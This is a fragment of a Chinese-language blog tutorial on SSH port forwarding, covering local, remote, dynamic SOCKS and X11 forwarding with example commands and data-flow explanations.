</pre></td><td class="code"><pre><span class="line">ssh -L &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh  hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Client上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -L 1234:localhost:389 Server</span>
</pre></td></tr></table></figure>

<p>这里的localhost指的是Server。在选择本地监听端口时通常为10334-65535之间且未使用的端口号，因为低于1024的端口号需要管理员权限。<br>然后我们的数据流将会是这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">Client-&gt;Client:1234-&gt;Client ssh-&gt;Server:22-&gt;Server:389</span>
</pre></td></tr></table></figure>

<p>最后Serve上的3389端口应用返回的数据逆向的传输回去完成整个通信。</p>
<h3 id="远程转发示例："><a href="#远程转发示例：" class="headerlink" title="远程转发示例："></a><a href="#远程转发示例：" title="远程转发示例："></a>远程转发示例：</h3><p>现在由于网络或防火墙的原因我们不能用SSH直接从Client连接到Server，但是反向连接却是被允许的，那我们就可以使用远程转发了。<br>远程转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">ssh -R &lt;<span class="built_in">local</span> port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;ssh hostname&gt;</span>
</pre></td></tr></table></figure>

<p>所以我们需要在Server上执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -R 1234:localhost:389 Client</span>
</pre></td></tr></table></figure>

<p>而此次的应用数据流和上面的本地转发依然是一样的，那为什么又要叫远程转发呢？往下看…</p>
<h3 id="本地转发与远程转发的区别与分析："><a href="#本地转发与远程转发的区别与分析：" class="headerlink" title="本地转发与远程转发的区别与分析："></a><a href="#本地转发与远程转发的区别与分析：" title="本地转发与远程转发的区别与分析："></a>本地转发与远程转发的区别与分析：</h3><p>本地转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Client ssh ————&gt; Server ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>远程转发时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">ssh：Server ssh ————&gt; Client ssh</span>
<span class="line">应用：Client ————&gt; Server</span>
</pre></td></tr></table></figure>

<p>从上面就可以看出区分本地转发还是远程转发就是看ssh的连接反向是否和应用的连接方向一致。</p>
<h4 id="如果别的主机想使用我们的本地转发应该怎么办呢？"><a href="#如果别的主机想使用我们的本地转发应该怎么办呢？" class="headerlink" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a><a href="#如果别的主机想使用我们的本地转发应该怎么办呢？" title="如果别的主机想使用我们的本地转发应该怎么办呢？"></a>如果别的主机想使用我们的本地转发应该怎么办呢？</h4><p>现在我们假设有A、B、C、D四台主机，A上面的应用想通过B建立的本地转发连接D的服务。<br>只需在B上面执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -g -L 1234:&lt;D&gt;:389 &lt;C&gt;</span>
</pre></td></tr></table></figure>

<p>然后在A上配置连接B的1234端口即可，这里的-g就是为了A能够使用B的本地端口转发。在上面的额连接中A&lt;——&gt;B和C&lt;——&gt;D之间的连接并不是安全的，它们之间并没有经过SSH加解密。</p>
<h2 id="其它类型的转发："><a href="#其它类型的转发：" class="headerlink" title="其它类型的转发："></a><a href="#其它类型的转发：" title="其它类型的转发："></a>其它类型的转发：</h2><h3 id="动态转发："><a href="#动态转发：" class="headerlink" title="动态转发："></a><a href="#动态转发：" title="动态转发："></a>动态转发：</h3><p>上面所讲到的动态转发，远程转发在应用的服务端都有固定端口号，那如果我们不知道这个端口号怎么办？比如Web浏览…<br>动态转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -D &lt;<span class="built_in">local</span> port&gt; &lt;ssh Server&gt;</span>
</pre></td></tr></table></figure>

<p>例如在你本地执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ssh -D 1080 root@ip</span>
</pre></td></tr></table></figure>

<p>这样就创建了一个socks代理服务，如果你有一台国外的vps，这就可以实现翻墙了而且不用担心GFW检测而封了ip。</p>
<h3 id="X协议转发："><a href="#X协议转发：" class="headerlink" title="X协议转发："></a><a href="#X协议转发：" title="X协议转发："></a>X协议转发：</h3><p>X窗口和VNC相似都可以给linux提供桌面窗口服务，现在我们要把Xclient端的X窗口显示在Xserver端。<br>先需要Xclient(也就是远程linux主机)上指定Xserver的位置，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> DISPLAY=&lt;X Server IP&gt;:&lt;display <span class="comment">#&gt;.&lt;virtual #&gt;</span></span>
</pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">export DISPLAY=youDesktop:1.0</span>
</pre></td></tr></table></figure>

<p>建立连接，则从本地主机(Xserver端)发起一个ssh连接即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -X &lt;ssh server&gt;</span>
</pre></td></tr></table></figure>

<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><a href="#Summary" title="Summary"></a>Summary</h2><p>总的来说，对于一些已知端口的应用如Telnet/Smtp等，我们可以使用本地转发或远程转发。而动态转发则实现了socks代理从而起到加密数据传输和突破防火墙的功能。</p>
]]></content>
      <categories>
        <category>网络代理</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
      </tags>
  </entry>
</search>
